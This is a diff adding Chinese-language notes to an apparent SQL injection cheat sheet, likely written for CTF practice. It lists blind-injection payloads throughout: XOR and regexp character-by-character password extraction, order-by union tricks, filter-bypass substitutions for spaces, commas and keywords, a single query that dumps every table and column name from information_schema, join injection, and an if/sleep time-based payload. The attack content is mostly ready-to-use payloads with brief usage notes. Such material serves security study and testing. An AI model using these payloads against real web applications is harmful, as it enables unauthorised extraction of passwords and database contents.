@@ -100,3 +100,120 @@
             就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了 
 
             `and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51)`  这个查询语句可以猜解中文的用户和_blank>密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.
+
+
+
+- 常用的盲注语句：
+
+1. XOR注入:
+
+    - payload：
+        `admin'^(ascii(mid((password)from(i)))>j)^'1'='1'%23`
+        或者
+        `admin'^(ascii(mid((password)from(i)for(1)))>j)^'1'='1'%23`
+
+        `mid()from()for()`：从XX除截取XX成员的部分内容，用`for()`限定截取长度
+
+        最前面和最后面的语句都固定为真（逻辑结果都为1），只有中间的语句不确定真假
+        那么整个payload的逻辑结果都由中间的语句决定，我们就可以用这个特性来判断盲注的结果了
+
+        `0^1^0 --> 1` 语句返回为真
+        `0^0^0 --> 0` 语句返回为假
+
+    - 使用场景：
+        过滤了关键字：and、or
+        过滤了逗号，
+        过滤了空格
+
+        如果这里过滤了=号的话，还可以用>或者<代替(大小的比较)
+
+        payload：
+        `admin'^(ascii(mid((password)from(i)))>j)^('2'>'1')%23`
+        如果这里过滤了%号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了 `'1'='1`
+
+2. regexp注入:
+
+    - payload:
+        `select (select语句) regexp '正则'`
+
+        与正常的查询语句的区别可以从以下例子中看出：
+        `select user_pass from users where user_id = 1`
+        `select (select user_pass from users where user_id = 1) regexp '^a'`
+
+        每次判断一位或一个表达式匹配结果，匹配正确则返回1，错误则返回0
+
+        或者regexp这个关键字还可以代替where条件里的=号：
+        `select * from users where user_pass regexp '^a9'`
+
+    - 使用场景：
+        过滤了=、in、like
+        这里的 `^` 如果也被过滤了的话，可以使用 `$` 来从后往前进行匹配：
+        `select (select user_pass from users where user_id = 1) regexp 'a$'`
+
+    - [更详细的参考资料](http://www.cnblogs.com/lcamry/articles/5717442.html)
+
+3. order by盲注：
+    - payload：
+        `select * from users where user_id = '1' union select 1,2,'a',4,5,6,7 order by 3`
+
+        `order by 'number' (asc/desc)`
+        即对某一列进行排序，默认是升序排列，即后面默认跟上asc，那么上面一句就相当于
+
+        `select * from users order by 3 asc`
+
+        通常，如果某一项属性有如下两组键值对：`user_id=3` 和 `user_passwd=a1275` ，他们分别是第一列和第三列，
+        则payload为：`select * from users where user_id = '3' union select $TEST order by 3` ，其中 `$TEST` 为自然数，一旦试出一个比 `user_passwd=a1275` 的首个值 `a` 更大的，则会自动由 user_id=3 的前面排到其后面，进而锁定 `user_id=3` 的成员对应密码的首个字母为 `a`
+
+    - 使用场景：
+        过滤了列名
+        过滤了括号
+        适用于已知该表的列名以及列名位置的注入
+
+4. 杂项：
+    1. 一些等效替代的函数(特殊符号)
+        字符：
+
+        空格 <--> `%20、%0a、%0b、/**/、 @tmp:=test`
+        `and` <--> `or`
+        `=` <--> `like` <--> `in` --> `regexp` <--> `rlike` --> `>` <--> `<`
+
+        # @tmp:=test只能用在select关键字之后，等号后面的字符串随意
+
+        函数：
+
+        字符串截断函数：`left()`、`mid()`、`substr()`、`substring()`
+        取ascii码函数：`ord()`、`ascii()`
+
+    2. 一次性报所有表明和字段名
+        
+        ```sql
+            (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x)
+        ```
+
+    3. `Subquery returns more than 1 row` 的解决方法：
+            产生这个问题的原因是 **子查询多于一列** ，也就是 **显示为只有一列** 的情况下，没有使用 `limit` 语句限制，就会产生这个问题，即 `limt 0,1`
+
+            如果我们这里的逗号被过滤了咋办？那就使用 `offset` 关键字：
+            `limit 1 offset 1`
+
+            如果我们这里的limit被过滤了咋办？那就试试下面的几种方法：
+
+            - group_concat(使用的最多)
+            - <>筛选(不等于)
+            - not in
+            - DISTINCT
+
+    4. join注入
+        payload：
+        `1' union select * from (select 1) a join (select 2) b %23`
+
+        优势：过滤了逗号的情况下使用
+
+    5. 带!的注入
+
+    6. if盲注(合理利用条件)
+            if盲注的基本格式：
+
+            if(条件,条件为真执行的语句,条件为假执行的语句)
+            DVE ampache 的利用方式就是这种：
+            admin' if(ascii(mid(user(),1,1))=100,sleep(5),1)
